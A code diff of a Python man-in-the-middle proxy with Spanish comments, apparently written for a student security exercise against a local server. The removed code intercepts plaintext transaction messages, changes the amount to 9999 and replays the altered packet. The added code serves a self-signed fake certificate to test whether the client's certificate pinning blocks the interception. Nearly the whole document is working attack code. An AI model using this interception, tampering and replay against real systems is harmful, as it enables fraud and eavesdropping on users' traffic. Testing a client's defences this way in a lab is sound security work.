@@ -1,103 +1,94 @@
 import socket
+import ssl
 import threading
-import time
+import os
+import datetime
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography import x509
+from cryptography.x509.oid import NameOID
+from cryptography.hazmat.primitives import hashes
 
 # -----------------------------
-# CONFIGURACIÓN DEL ATACANTE
+# CONFIGURACIÓN DEL PROXY MitM
 # -----------------------------
-# El puerto falso donde vamos a engañar al cliente para que se conecte
 PUERTO_FALSO = 3444 
-
-# A dónde vamos a reenviar el tráfico (el servidor real de la víctima)
 HOST_REAL = "127.0.0.1"
 PUERTO_REAL = 3443 
 
-def reenviar_datos(origen, destino, direccion):
-    while True:
-        try:
-            datos = origen.recv(4096)
-            if not datos:
-                break
-            
-            mensaje = datos.decode('utf-8', errors='ignore')
-            
-            if direccion == "CLIENTE -> SERVIDOR":
-                print(f"\n[+] Interceptado ({direccion}): {mensaje}")
-                
-                # ======================================================
-                # ZONA DE ATAQUE: MAN-IN-THE-MIDDLE (MitM)
-                # ======================================================
-                if "TRANSACCION" in mensaje:
-                    print("[!] ¡Modificando transacción al vuelo (MitM)!")
-                    # Formato de vuestro grupo: TRANSACCION:token:origen:destino:cantidad:nonce:mac
-                    partes = mensaje.split(':')
-                    
-                    if len(partes) >= 7:
-                        # Cambiamos la cantidad (índice 4) a 9999
-                        partes[4] = "9999.0" 
-                        # Reconstruimos el mensaje manipulado
-                        datos_manipulados = ":".join(partes).encode()
-                        print(f"[!] Paquete modificado: {datos_manipulados.decode()}")
-                        
-                        # Enviamos el paquete manipulado en lugar del original
-                        destino.sendall(datos_manipulados)
-                        
-                        # ======================================================
-                        # ZONA DE ATAQUE: REPLAY (Repetición)
-                        # ======================================================
-                        print("[!] Esperando 1 segundo para lanzar ataque de Replay...")
-                        time.sleep(1)
-                        print("[!] Reenviando paquete clonado (Replay)")
-                        destino.sendall(datos_manipulados) # Lo mandamos por segunda vez
-                        
-                        continue # Saltamos el envío normal porque ya hemos enviado el manipulado
-                
-            elif direccion == "SERVIDOR -> CLIENTE":
-                print(f"\n[-] Interceptado ({direccion}): {mensaje}")
+CERT_FALSO = "certs/fake_cert.pem"
+KEY_FALSA = "certs/fake_key.pem"
 
-            # Envío normal si no hemos manipulado nada
-            destino.sendall(datos)
-            
-        except Exception as e:
-            print(f"[x] Conexión cerrada en {direccion}")
-            break
-
-def manejar_conexion(cliente_socket):
-    # Conectamos con el servidor real
-    servidor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        servidor_socket.connect((HOST_REAL, PUERTO_REAL))
-    except Exception as e:
-        print("[x] No se pudo conectar al servidor real. ¿Está encendido?")
-        cliente_socket.close()
+def generar_cert_falso():
+    """Genera un certificado falso sobre la marcha para intentar engañar al cliente."""
+    if os.path.exists(CERT_FALSO) and os.path.exists(KEY_FALSA):
         return
 
-    # Creamos dos hilos: uno para escuchar al cliente y otro al servidor
-    hilo_c2s = threading.Thread(target=reenviar_datos, args=(cliente_socket, servidor_socket, "CLIENTE -> SERVIDOR"))
-    hilo_s2c = threading.Thread(target=reenviar_datos, args=(servidor_socket, cliente_socket, "SERVIDOR -> CLIENTE"))
-    
-    hilo_c2s.start()
-    hilo_s2c.start()
+    print("[*] Generando certificado FALSO para el ataque MitM...")
+    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    subject = issuer = x509.Name([
+        x509.NameAttribute(NameOID.COMMON_NAME, u"localhost (HACKER)"),
+    ])
+    cert = x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(
+        private_key.public_key()
+    ).serial_number(x509.random_serial_number()).not_valid_before(
+        datetime.datetime.now(datetime.timezone.utc)
+    ).not_valid_after(
+        datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
+    ).sign(private_key, hashes.SHA256())
 
-def iniciar_proxy():
+    with open(KEY_FALSA, "wb") as f:
+        f.write(private_key.private_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PrivateFormat.TraditionalOpenSSL,
+            encryption_algorithm=serialization.NoEncryption()
+        ))
+    with open(CERT_FALSO, "wb") as f:
+        f.write(cert.public_bytes(serialization.Encoding.PEM))
+
+def manejar_victima(cliente_conn, addr):
+    # 1. Configuramos el contexto SSL del servidor falso
+    contexto_falso = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    contexto_falso.load_cert_chain(certfile=CERT_FALSO, keyfile=KEY_FALSA)
+
+    print(f"\n[!] Víctima interceptada desde {addr}. Intentando handshake TLS falso...")
+    try:
+        # Aquí intentamos engañar al cliente con nuestro certificado falso
+        conn_tls_falsa = contexto_falso.wrap_socket(cliente_conn, server_side=True)
+        print("\n[💀] ¡PELIGRO! MitM EXITOSO. El cliente ha aceptado el certificado falso.")
+        # Si llegamos aquí, el pinning falló o está desactivado.
+        
+    except ssl.SSLError as e:
+        print(f"\n[🛡️] MitM BLOQUEADO. El cliente detectó el certificado falso y cortó la conexión.")
+        print(f"    Motivo del rechazo del cliente: {e}")
+    except Exception as e:
+        print(f"Error inesperado: {e}")
+    finally:
+        cliente_conn.close()
+
+def iniciar_proxy_tls():
+    generar_cert_falso()
+    
     proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     proxy.bind(("127.0.0.1", PUERTO_FALSO))
     proxy.listen(5)
-    proxy.settimeout(1.0)
-    print(f"[*] PROXY ATACANTE ESCUCHANDO EN EL PUERTO {PUERTO_FALSO}...")
-    print(f"[*] Reenviando tráfico al servidor real en {PUERTO_REAL}...")
+    
+    print(f"[*] PROXY TLS ATACANTE ESCUCHANDO EN EL PUERTO {PUERTO_FALSO}...")
     
     while True:
         try:
             cliente_conn, addr = proxy.accept()
-            print(f"\n[*] ¡Víctima conectada desde {addr}!")
-            threading.Thread(target=manejar_conexion, args=(cliente_conn,), daemon=True).start()
-        except socket.timeout:
-            pass # Respira y vuelve a mirar si hay conexiones o si pulsaste Ctrl+C
+            threading.Thread(target=manejar_victima, args=(cliente_conn, addr), daemon=True).start()
+        except (socket.timeout, TimeoutError):
+            pass # Hace una pausa y comprueba si has pulsado Ctrl+C
         except KeyboardInterrupt:
             print("\n[!] Apagando el proxy atacante...")
             break
+        except Exception as e:
+            # Si el cliente da un portazo y genera un error raro, el proxy no muere
+            print(f"[!] Error inesperado en el proxy ignorado: {e}")
+            pass
 
 if __name__ == "__main__":
-    iniciar_proxy()
+    iniciar_proxy_tls()
